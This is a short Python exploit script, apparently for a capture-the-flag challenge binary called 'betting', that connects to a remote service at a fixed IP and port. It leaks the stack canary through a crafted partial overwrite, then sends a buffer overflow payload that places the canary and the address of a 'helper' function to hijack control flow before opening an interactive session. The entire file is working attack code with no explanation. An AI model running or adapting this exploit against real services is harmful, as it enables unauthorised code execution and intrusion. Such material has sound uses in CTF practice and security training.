from yeonnic import *

context.arch="amd64"
elf=ELF("./betting")

#p=process("./betting")
p = remote("110.10.147.29", 8282)

gdb_attach(p, "b *0x400afd\nc")

print p.recv()
p.send("A"*0x17+"B\x01")
print p.recv()
p.sendline("100")
print p.recvuntil("AB")
canary = u64(p.recv(8)) - 1
print p.recv()


p.sendline("100")
print p.recv()

p.sendline("A"*0x28 + flat(canary, 0, elf.symbols['helper']))
print p.recv()

print 'canary -> ', hex(canary)

p.interactive()
